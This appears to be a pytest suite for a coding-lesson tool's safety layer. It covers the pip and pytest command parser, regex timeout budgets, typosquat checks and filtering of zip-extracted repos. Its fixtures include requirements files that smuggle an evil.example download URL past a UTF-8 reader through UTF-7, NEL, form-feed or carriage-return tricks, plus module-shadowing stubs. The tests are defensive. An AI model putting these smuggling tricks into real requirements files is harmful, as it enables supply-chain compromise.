"""eng-agency leftovers (offline: no model, keys unset, no network; the only processes are the regex worker's own
Python and one `python -I -m <probe>` that shows what -I does)."""
from __future__ import annotations

import io
import json
import os
import re
import subprocess
import sys
import threading
import time
import zipfile
from types import SimpleNamespace

import pytest

from server.checks.evaluator import (FILE_SCAN_CHARS, RunContext, evaluate_check, scan_windows,
                                     screen_check_on_file)
from server.lesson.schema import MAX_LESSON_PATTERNS, MAX_STEP_CHECKS, validate_untrusted_lesson
from server.safety import packages, regex_worker
from server.safety.commands import Allowed, Manual, parse_run_command
from server.safety.patterns import pattern_problem, safe_compile
from server.workspace import resources, scaffold

# ------------------------------------------------------------------ 1. requirements files pip decodes differently

# the reviewer's file: utf-7 hides a line break, so pip reads a third requirement, an sdist URL
UTF7 = b"# coding: utf-7\nnumpy\n#+AAo-https+ADo-//evil.example/evil-1.0.tar.gz\n"


def test_the_utf7_requirements_file_hides_a_url_from_a_utf8_reader():
    # what pip sees (it honours the coding line) vs what a UTF-8 reader sees: the reason the file is refused
    assert "https://evil.example/evil-1.0.tar.gz" in UTF7.decode("utf-7").splitlines()
    assert "https://evil.example/evil-1.0.tar.gz" not in UTF7.decode("utf-8").splitlines()


@pytest.mark.parametrize("data", [
    UTF7,
    b"numpy\n# caf\xe9 \x85https://evil.example/e.tar.gz\n",  # latin-1: \x85 (NEL) is a line break to pip
    b"\xef\xbb\xbfnumpy\n",  # a BOM
    b"\xff\xfen\x00u\x00m\x00p\x00y\x00\n\x00",  # UTF-16 with its BOM
    b"numpy\n# -*- coding: latin-1 -*-\n",  # a coding line on line 2
    b"numpy\x0chttps://evil.example/x.tar.gz\n",  # a form feed: str.splitlines() breaks there
    b"numpy\x0bpandas\n",
    b"numpy\x1chttps://evil.example/x\n",
    b"numpy\rhttps://evil.example/x\n",  # a lone carriage return
    b"numpy\x00\n",
    b"numpy  # caf\xc3\xa9\n",  # even a UTF-8 comment: plain ASCII only
])
def test_requirements_pip_would_read_differently_are_never_run(tmp_path, data):
    (tmp_path / "requirements.txt").write_bytes(data)
    for cmd in ("pip install -r requirements.txt", "python3 -m pip install -r requirements.txt"):
        res = parse_run_command(cmd, tmp_path)
        assert isinstance(res, Manual) and not res.structural, (cmd, res)
    assert packages.decode_requirements(data)[0] is None
    try:  # a scaffold never writes one either (its content is written as UTF-8)
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return
    assert scaffold.content_problem("requirements.txt", text)


def test_pip_gets_the_verified_names_never_the_file(tmp_path):
    (tmp_path / "requirements.txt").write_bytes(b"numpy >= 1.26  # arrays\r\nflask\r\n\r\n# done\r\n")
    res = parse_run_command("pip install -r requirements.txt", tmp_path)
    assert isinstance(res, Allowed) and res.argv == ("pip", "install", "numpy>=1.26", "flask")
    assert "-r" not in res.argv and res.details == "Installs (from requirements.txt): numpy, flask"
    assert res.command == "pip install 'numpy>=1.26' flask"  # the card shows (and the terminal gets) just that
    py = parse_run_command("python3 -m pip install -r requirements.txt", tmp_path)
    assert py.argv == ("python3", "-I", "-m", "pip", "install", "numpy>=1.26", "flask")
    # a rewritten command without specifiers parses to itself
    (tmp_path / "requirements.txt").write_text("numpy\nflask\n")
    py = parse_run_command("python3 -m pip install -r requirements.txt", tmp_path)
    assert parse_run_command(py.command, tmp_path).argv == py.argv == ("python3", "-I", "-m", "pip", "install",
                                                                     "numpy", "flask")


def test_a_requirements_file_with_no_packages_runs_nothing(tmp_path):
    (tmp_path / "requirements.txt").write_text("# nothing yet\n\n")
    res = parse_run_command("pip install -r requirements.txt", tmp_path)
    assert isinstance(res, Manual) and "no packages" in res.reason


# ------------------------------------------------------------------ 2. pip / pytest can't be shadowed by lesson files

def test_python_m_pip_always_runs_isolated(tmp_path):
    (tmp_path / "pip.py").write_text("print('HIJACKED')\n")
    for cmd in ("python3 -m pip install numpy", ".venv/bin/python -m pip install numpy pandas"):
        res = parse_run_command(cmd, tmp_path)
        assert isinstance(res, Allowed) and res.argv[1:4] == ("-I", "-m", "pip"), res
        assert res.command.split()[1] == "-I"  # what the card shows and VS Code's terminal gets
    assert parse_run_command("pip install numpy", tmp_path).argv == ("pip", "install", "numpy")


def test_what_the_isolated_flag_does(tmp_path):
    # a lesson-folder module named like the one `-m` runs: without -I it runs, with -I it is never imported
    (tmp_path / "miyagi_probe_pip.py").write_text("print('HIJACKED')\n")
    env = {"PATH": os.environ.get("PATH", "")}
    plain = subprocess.run([sys.executable, "-m", "miyagi_probe_pip"], cwd=tmp_path, env=env, capture_output=True,
                           text=True, timeout=30)
    iso = subprocess.run([sys.executable, "-I", "-m", "miyagi_probe_pip"], cwd=tmp_path, env=env,
                         capture_output=True, text=True, timeout=30)
    assert "HIJACKED" in plain.stdout and "HIJACKED" not in iso.stdout and iso.returncode != 0


@pytest.mark.parametrize("shadow", ["pytest.py", "_pytest", "Pytest.py", "py.py", "pluggy"])
def test_pytest_never_runs_next_to_a_lesson_file_named_like_it(tmp_path, shadow):
    (tmp_path / "tests").mkdir()
    if shadow.endswith(".py"):
        (tmp_path / shadow).write_text("print('HIJACKED')\n")
    else:
        (tmp_path / shadow).mkdir()
    for cmd in ("python3 -m pytest tests", "pytest -q tests"):
        res = parse_run_command(cmd, tmp_path)
        assert isinstance(res, Manual) and shadow in res.reason and not res.structural, (cmd, res)


def test_pytest_still_runs_in_a_plain_lesson_folder(tmp_path):
    (tmp_path / "tests").mkdir()
    (tmp_path / "calc.py").write_text("x = 1\n")
    assert parse_run_command("python3 -m pytest tests", tmp_path).argv == ("python3", "-m", "pytest", "tests")


@pytest.mark.parametrize("path", ["pip.py", "pytest.py", "_pytest/x.py", "PIP.py", "pip/__init__.py"])
def test_a_scaffold_never_writes_a_top_level_pip_or_pytest(path):
    assert scaffold._safe_rel(path) is None


def test_a_scaffold_still_writes_those_names_below_the_top():
    assert scaffold._safe_rel("src/pip_utils.py") == "src/pip_utils.py"
    assert scaffold._safe_rel("tools/pytest.py") == "tools/pytest.py"


# ------------------------------------------------------------------ 3 / 5. the regex budget and strikes

SLOW_TEXT = "# " + "-" * 25


def _slow(i: int) -> str:
    return f"(?:id{i}x)?" + "-?" * 25 + "-" * 25 + "z"  # ~270 ms on SLOW_TEXT, past the worker's deadline


def test_a_lessons_regex_budget_stops_its_slow_patterns_after_a_few_timeouts():
    key = ("test-budget", time.monotonic())
    t0 = time.monotonic()
    with regex_worker.budget(key) as b:
        for i in range(regex_worker.LESSON_TIMEOUTS):
            assert safe_compile(_slow(i)).search(SLOW_TEXT) is None
        assert b.timeouts == regex_worker.LESSON_TIMEOUTS and b.exhausted
        t1 = time.monotonic()
        for i in range(100, 160):  # 60 more distinct slow patterns: none of them runs
            assert safe_compile(_slow(i)).search(SLOW_TEXT) is None
        assert time.monotonic() - t1 < 1.0
        assert safe_compile(r"def add\(").search("def add(a, b)")  # a linear pattern still runs in-process
    assert time.monotonic() - t0 < regex_worker.LESSON_TIMEOUTS * (regex_worker.DEADLINE_S + 1.5) + 1.0
    # another lesson has its own budget; outside any lesson there is none
    with regex_worker.budget(("other", key)) as other:
        assert not other.exhausted
    assert regex_worker._CURRENT.get() is None


def test_old_timeouts_leave_a_lessons_budget(monkeypatch):
    now = [1000.0]
    monkeypatch.setattr(regex_worker.time, "monotonic", lambda: now[0])
    b = regex_worker.Budget("decay")
    for _ in range(regex_worker.LESSON_TIMEOUTS):
        b.add()
    assert b.exhausted
    now[0] += regex_worker.LESSON_WINDOW_S + 1  # a stall long ago: the lesson's patterns run again
    assert not b.exhausted and b.timeouts == 0


def test_a_budget_holds_in_the_thread_its_context_runs_in_only():
    import asyncio
    import contextvars

    key = ("thread-budget", time.monotonic())
    seen = []

    def work():
        seen.append(regex_worker._CURRENT.get())

    async def go():
        with regex_worker.budget(key):
            await asyncio.to_thread(work)  # copies the context: the budget goes with it
        await asyncio.to_thread(work)

    asyncio.run(go())
    assert seen[0] is regex_worker.lesson_budget(key) and seen[1] is None
    t = threading.Thread(target=contextvars.copy_context().run, args=(work,))
    t.start()
    t.join()
    assert seen[2] is None


def test_one_timeout_is_a_strike_not_a_ban():
    p = _slow(999)
    assert safe_compile(p).search(SLOW_TEXT) is None  # timed out once (a stalled Mac looks the same)
    assert pattern_problem(p) is None and regex_worker.is_bad(p) is None
    assert regex_worker.strike(p)  # the second strike bans it
    assert pattern_problem(p) and regex_worker.is_bad(p)


def test_bans_are_kept_as_hashes_without_a_small_cap(monkeypatch):
    monkeypatch.setattr(regex_worker, "_BAD", {})
    monkeypatch.setattr(regex_worker, "_STRIKES", {})
    monkeypatch.setattr(regex_worker, "MAX_REMEMBERED", 6000)
    for i in range(5000):  # past the old 4096 cap
        for _ in range(regex_worker.BAN_STRIKES):
            regex_worker.strike(f"pattern-{i}")
    assert regex_worker.is_bad("pattern-0") and regex_worker.is_bad("pattern-4999")
    assert all(isinstance(k, bytes) and len(k) == 16 for k in regex_worker._BAD)


def test_an_answer_waiting_past_the_deadline_is_read_not_a_timeout():
    # the engine (not the pattern) was stopped: the worker's answer has been in the pipe since
    r, w = os.pipe()
    try:
        os.write(w, b'{"r": null}\n')
        wk = regex_worker._Worker()
        wk.proc = SimpleNamespace(stdout=SimpleNamespace(fileno=lambda: r))
        assert wk._read_line(time.monotonic() - 5.0) == b'{"r": null}'
        with pytest.raises(regex_worker._Timeout):  # nothing there: a timeout, at once
            wk._read_line(time.monotonic() - 5.0)
    finally:
        os.close(r)
        os.close(w)


def test_the_worker_is_started_without_writing_bytecode(monkeypatch):
    calls = []

    def popen(argv, **kw):
        calls.append(argv)
        raise OSError("not started in this test")

    monkeypatch.setattr(regex_worker, "_Popen", popen)
    wk = regex_worker._Worker()
    assert wk._start() is False
    assert calls and calls[0][1:4] == ["-I", "-S", "-B"]


def test_validation_caps_checks_per_step_and_patterns_per_lesson():
    def check(i):
        return {"id": f"c{i}", "type": "file_contains", "label": "x", "file": "main.py", "pattern": f"name_{i}"}

    g = {"lesson": {"id": "x"}, "steps": [{"id": "s0", "checks": [check(i) for i in range(MAX_STEP_CHECKS + 10)]}]}
    validate_untrusted_lesson(g)
    assert len(g["steps"][0]["checks"]) == MAX_STEP_CHECKS
    steps = [{"id": f"s{k}", "checks": [check(k * 100 + i) for i in range(20)]} for k in range(30)]  # 600 patterns
    g = {"lesson": {"id": "x"}, "steps": steps}
    validate_untrusted_lesson(g)
    assert sum(len(s["checks"]) for s in g["steps"]) == MAX_LESSON_PATTERNS


# ------------------------------------------------------------------ 4. file_contains on a big notebook / file

def _big_notebook(tmp_path):
    epochs = [f"epoch {i}/3000 - loss: {1 / (i + 1):.6f} - accuracy: 0.{i % 97:02d}\n" for i in range(3000)]
    nb = {"nbformat": 4, "nbformat_minor": 5, "metadata": {}, "cells": [
        {"cell_type": "code", "metadata": {}, "execution_count": 1, "outputs": [],
         "source": ["import numpy as np\n", "import tensorflow as tf\n"]},
        {"cell_type": "code", "metadata": {}, "execution_count": 2,
         "outputs": [{"output_type": "stream", "name": "stdout", "text": epochs}],
         "source": ["for i in range(3000):\n", "    train_step(i)\n"]},
    ]}
    p = tmp_path / "train.ipynb"
    p.write_text(json.dumps(nb, indent=1))
    assert p.stat().st_size > 80_000
    return p


@pytest.mark.parametrize("pattern", ["import numpy as np", r"range\(3000\)", r"epoch 2999/3000"])
def test_file_contains_finds_a_big_notebooks_code(tmp_path, pattern):
    _big_notebook(tmp_path)
    c = {"id": "n1", "type": "file_contains", "label": "x", "file": "train.ipynb", "pattern": pattern}
    r = evaluate_check(c, RunContext(workdir=str(tmp_path)))
    assert r["status"] == "pass", r


def test_screen_check_on_a_big_notebook_finds_its_code(tmp_path):
    p = _big_notebook(tmp_path)
    r = screen_check_on_file({"id": "n2", "label": "x", "pattern": "import numpy as np"}, p)
    assert r["status"] == "pass", r


def test_file_contains_scans_a_big_file_in_windows_up_to_a_cap(tmp_path):
    body = "".join(f"x_{i} = {i}\n" for i in range(40_000))  # ~500 KB
    (tmp_path / "big.py").write_text("import numpy as np\n" + body + "print('done')\n")
    c = {"id": "b1", "type": "file_contains", "label": "x", "file": "big.py", "pattern": r"^import numpy as np$"}
    r = evaluate_check(c, RunContext(workdir=str(tmp_path)))
    assert r["status"] == "pass" and r["detail"].endswith("big.py:1"), r
    c2 = {**c, "pattern": r"^x_20000 = 20000$"}
    assert evaluate_check(c2, RunContext(workdir=str(tmp_path)))["detail"].endswith("big.py:20002")
    # far beyond the cap (here ~3 MB above the end): never scanned
    (tmp_path / "huge.py").write_text("import numpy as np\n" + "y = 1  # filler line\n" * 150_000)
    c3 = {**c, "file": "huge.py"}
    assert evaluate_check(c3, RunContext(workdir=str(tmp_path)))["status"] == "fail"


def test_scan_windows_overlap_and_each_fit_one_search():
    text = "".join(f"line {i:06d}\n" for i in range(30_000))
    wins = list(scan_windows(text))
    assert len(wins) > 1 and all(len(sc.text) <= FILE_SCAN_CHARS for _, sc in wins)
    offs = [o for o, _ in wins]
    assert offs == sorted(offs, reverse=True) and offs[-1] == 0
    for (o1, s1), (o2, s2) in zip(wins, wins[1:]):
        assert o2 + len(s2.text) > o1  # each window overlaps the newer one
    assert [(o, sc.text) for o, sc in scan_windows("short")] == [(0, "short")]


# ------------------------------------------------------------------ 8. typosquat near misses

@pytest.mark.parametrize("name,near", [("boto", "boto3"), ("requests-x", "requests"), ("pyopenai", "openai")])
def test_real_projects_near_a_listed_name_get_a_confirm_that_names_it(name, near):
    v = packages.verdict(name)
    assert v.kind == packages.CONFIRM and v.near == near and near in v.reason
    assert v.url == f"https://pypi.org/project/{name}/"


@pytest.mark.parametrize("name", ["reqeusts", "numpyy", "pandsa", "scikitlearn", "boto4"])
def test_one_typo_away_is_still_refused(name):
    assert packages.verdict(name).kind == packages.REFUSE


def test_a_near_miss_is_never_run_for_the_learner_without_its_own_confirm(tmp_path):
    res = parse_run_command("pip install boto", tmp_path)
    assert isinstance(res, Manual) and "boto3" in res.reason and "pypi.org/project/boto/" in res.reason
    from server.workspace.setup import recipe

    r = recipe({"tool": "boto", "kind": "python_package", "pip_name": "boto"}, None)
    assert r.get("confirm") == "boto" and r.get("near") == "boto3" and "refused" not in r


# ------------------------------------------------------------------ 9. a downloaded repo's config files

def test_a_downloaded_repo_never_unpacks_editor_ci_or_shell_config(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name in ("repo-main/main.py", "repo-main/.gitignore", "repo-main/src/util.py",
                     "repo-main/.vscode/tasks.json", "repo-main/.github/workflows/ci.yml", "repo-main/.envrc",
                     "repo-main/.npmrc", "repo-main/.venv/bin/python", "repo-main/node_modules/x/index.js",
                     "repo-main/.devcontainer/devcontainer.json", "repo-main/src/.env", "repo-main/.git/config",
                     "repo-main/pip.py"):
            z.writestr(name, "x\n")
    dest = tmp_path / "tutorial" / "repo"
    n = resources._extract_zip(buf.getvalue(), dest)
    got = sorted(p.relative_to(dest).as_posix() for p in dest.rglob("*") if p.is_file())
    assert got == [".gitignore", "main.py", "src/util.py"] and n == 3
